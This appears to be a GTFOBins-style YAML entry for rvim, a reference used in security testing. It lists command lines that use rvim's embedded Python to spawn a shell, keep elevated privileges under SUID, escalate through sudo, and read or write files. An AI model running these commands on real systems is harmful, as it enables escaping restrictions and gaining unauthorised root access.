---
functions:
  shell:
    - description: This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.
      code: rvim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
  file-write:
    - description: This requires that rvim is compiled with Python support. Prepend `:py3` for Python 3.
      code: |
        rvim file_to_write
        iDATA
        ^[
        w
  file-read:
    - code: rvim file_to_read
  suid:
    - description: This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.
      code: ./rvim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
  sudo:
    - description: This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.
      code: sudo rvim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
---
